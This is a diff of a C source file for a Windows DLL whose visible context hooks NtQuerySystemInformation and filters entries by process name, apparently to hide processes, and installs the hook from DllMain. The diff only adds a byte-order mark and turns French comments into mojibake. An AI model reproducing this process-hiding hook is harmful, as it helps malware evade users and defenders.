@@ -1,4 +1,4 @@
-#define _CRT_SECURE_NO_WARNINGS
+ï»¿#define _CRT_SECURE_NO_WARNINGS
 
 #include <Windows.h>
 #include <Psapi.h>
@@ -9,7 +9,7 @@
 
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 
-// Structure adaptée pour 64 bits
+// Structure adaptï¿½e pour 64 bits
 typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
     ULONG NextEntryOffset;
     ULONG NumberOfThreads;
@@ -60,7 +60,7 @@ NTSTATUS NTAPI HookedNtQuerySystemInformation(
             PMY_SYSTEM_PROCESS_INFORMATION pNextEntry =
                 (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-            // Vérification sécurisée du nom du processus
+            // Vï¿½rification sï¿½curisï¿½e du nom du processus
             if (pNextEntry->ImageName.Buffer != NULL &&
                 pNextEntry->ImageName.Length > 0) {
 
@@ -140,7 +140,7 @@ void SetHook() {
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
     switch (dwReason) {
     case DLL_PROCESS_ATTACH:
-        // Éviter les appels bloquants dans DllMain
+        // ï¿½viter les appels bloquants dans DllMain
         DisableThreadLibraryCalls(hModule);
         CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SetHook, NULL, 0, NULL);
         break;
